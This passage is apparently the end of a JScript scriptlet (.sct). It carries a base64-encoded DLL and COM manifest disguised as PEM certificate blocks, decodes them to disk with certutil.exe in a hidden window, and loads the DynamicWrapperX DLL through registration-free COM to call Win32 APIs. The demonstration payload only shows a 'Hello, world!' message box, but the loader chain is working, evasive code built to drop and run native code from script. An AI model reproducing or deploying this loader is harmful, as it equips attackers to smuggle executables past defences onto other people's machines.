								/yUsYQAQ/yUwYQAQ/yU4YQAQ/yVAYQAQ/yVEYQAQ/yVIYQAQUGEAAAAAAAAAAAAA\
								uGEAAOhgAACMYQAAAAAAAAAAAADSYgAAJGEAAKBhAAAAAAAAAAAAAAhjAAA4YQAA\
								qGEAAAAAAAAAAAAAIGMAAEBhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMVhAADiYQAA\
								8mEAAARiAAAaYgAALGIAADpiAABIYgAAYGIAAHhiAACGYgAAlmIAAKxiAADCYgAA\
								AAAAAN1iAADoYgAA8mIAAP5iAAAAAAAAEmMAAAAAAAAtYwAAPmMAAE5jAAAAAAAA\
								xWEAAOJhAADyYQAABGIAABpiAAAsYgAAOmIAAEhiAABgYgAAeGIAAIZiAACWYgAA\
								rGIAAMJiAAAAAAAA3WIAAOhiAADyYgAA/mIAAAAAAAASYwAAAAAAAC1jAAA+YwAA\
								TmMAAAAAAABLRVJORUwzMi5kbGwAhABEaXNhYmxlVGhyZWFkTGlicmFyeUNhbGxz\
								AAA6AkxvYWRMaWJyYXJ5QQAAkAFHZXRQcm9jQWRkcmVzcwAAbAFHZXRNb2R1bGVG\
								aWxlTmFtZUEAAAIBR2V0Q29tbWFuZExpbmVBAOkARnJlZUxpYnJhcnkA4wFHbG9i\
								YWxBbGxvYwAWAkludGVybG9ja2VkSW5jcmVtZW50AAASAkludGVybG9ja2VkRGVj\
								cmVtZW50AADqAUdsb2JhbEZyZWUAAD0CTG9hZExpYnJhcnlXAAB3A1dpZGVDaGFy\
								VG9NdWx0aUJ5dGUAXQJNdWx0aUJ5dGVUb1dpZGVDaGFyALwCUnRsTW92ZU1lbW9y\
								eQBtc3ZjcnQuZGxsAPgCc3ByaW50ZgAABANzdHJsZW4AACgCX3djc2ljbXAAACwD\
								d2NzbGVuAABvbGUzMi5kbGwA1QBJc0VxdWFsR1VJRABPTEVBVVQzMi5kbGwAWABT\
								eXNBbGxvY1N0cmluZwBbAFN5c0ZyZWVTdHJpbmcAWgBTeXNBbGxvY1N0cmluZ0xl\
								bgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAA1dfhIAAAAAFxwAAABAAAABQAAAAUAAABIcAAA\
								NHAAAChwAAAAAAEAAgADAAQAAABpcAAAeXAAAItwAACWcAAAqHAAAB4QAABwEgAA\
								UhIAADEQAADnEQAAZHlud3JhcHguZGxsAERsbENhblVubG9hZE5vdwBEbGxHZXRD\
								bGFzc09iamVjdABEbGxJbnN0YWxsAERsbFJlZ2lzdGVyU2VydmVyAERsbFVucmVn\
								aXN0ZXJTZXJ2ZXIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								ABAAAKgAAAAOMB8wJTA+MFMwYzBzMJEwmzCgMKUwCTFNMVIxVzGGMZIxoTHaMfEx\
								AjISMhgyJDIqMl0yejKRMrwyzTIhMywzMzN0M4MznjOvMxg0PzS8NO829TYRN/03\
								CjitOLU4wzjWODg5WjpgOmY6kzqbOqE6HTsiO0Q7ijvGOwY8FTwkPDM8QjxRPGA8\
								bzx+PJA8ojy0PMY82DzqPPw8IT0rPUQ9ACAAADQAAAAoMWIxoDHaMREyVDL7NAE1\
								GDWQNZY1iTaPNq82tza9NtY2JDcsNzI3SjcAAAAwAAAQAAAAKDAwMDgwRjAAQAAA\
								gAEAAOgw7DDwMPQw+DD8MAAxBDEIMQwxEDEUMRgx3DHgMeQx6DHsMfwxADIEMggy\
								DDIcMiAyJDIoMiwyPDJAMkQySDJMMlAyWDJcMmAyZDJoMmwyfDKAMoQyiDKMMpwy\
								oDKkMqgyrDK8MsAyxDLIMswy3DLgMuQy6DLsMvwyADMEMwgzDDM4M1gzeDN8M4Az\
								hDOIM4wzlDOcM6AzpDOoM6wztDO8M8AzxDPIM8wz1DPcM+Az5DPoM+wz9DP8MwA0\
								BDQINAw0FDQcNCA0JDQoNCw0NDQ8NEA0RDRINEw0VDRcNGA0ZDRoNGw0dDR8NIA0\
								hDSINIw0lDScNKA0pDSoNKw0tDTYNPg0GDUcNSA1JDUoNSw1MDU0NTg1PDVANUQ1\
								SDVMNVA1VDVYNVw1YDVkNWg1bDWkNcg11DXYNdw1ADYMNhA2FDYYNjQ2QDZENkg2\
								TDZ0NoA2hDaINow2rDa4Nrw2wDbENvw2CDcMNxA3FDdEN1A3VDdYN1w3AAAAYAAA\
								NAAAAAIwCDAOMBQwGjAgMCYwLDAyMDgwPjBEMEowUDBWMFwwYjBoMG4wdDB6MIAw\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
								AAAAAAAAAAAAAAAAAAAAAA==\
								-----END CERTIFICATE-----"



			var dynwrapperManifest = "-----BEGIN CERTIFICATE-----\
									PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9\
									InllcyI/Pg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQt\
									Y29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KDQoJPGZpbGUgbmFt\
									ZT0iZHlud3JhcHguZGxsIj4NCiAgICAJPGNvbUNsYXNzDQogICAgICAgIAlkZXNj\
									cmlwdGlvbj0iRHluYW1pY1dyYXBwZXJYIENsYXNzIg0KICAgICAgICAJY2xzaWQ9\
									Ins4OTU2NTI3NS1BNzE0LTRhNDMtOTEyRS05NzhCOTM1RURDQ0N9Ig0KICAgICAg\
									ICAJdGhyZWFkaW5nTW9kZWw9IkJvdGgiDQogICAgICAgIAlwcm9naWQ9IkR5bmFt\
									aWNXcmFwcGVyWCIvPg0KCTwvZmlsZT4NCg0KPC9hc3NlbWJseT4=\
									-----END CERTIFICATE-----";


			var WshShell =  new ActiveXObject("WScript.Shell");
			var WshProcEnv = WshShell.Environment("Process");
			var process_arch = WshProcEnv("PROCESSOR_ARCHITECTURE");
			

			
			SaveStringToFile("dynwrapx.txt", x86dllEncoded);
			var r = new ActiveXObject("WScript.Shell").Run("certutil.exe /decode dynwrapx.txt dynwrapx.dll", 0);
			sleep(5000);
			SaveStringToFile("dynwrapmanifest.txt", dynwrapperManifest);
			r = new ActiveXObject("WScript.Shell").Run("certutil.exe /decode dynwrapmanifest.txt dynwrap.manifest", 0); 
			sleep(5000);
			var actCtx = new ActiveXObject("Microsoft.Windows.ActCtx");
			actCtx.Manifest = "dynwrap.manifest";
			try
			{
				var DX = actCtx.CreateObject("DynamicWrapperX");
				DX.Register("user32.dll", "MessageBoxW", "i=hwwu", "r=l");  // Register a dll function.
				res = DX.MessageBoxW(0, "Hello, world!", "Test", 4);        // Call the function.
			}
			catch(e){ WScript.Echo("Fail");}
			
		

			
		]]>
</script>
</registration>
</scriptlet>
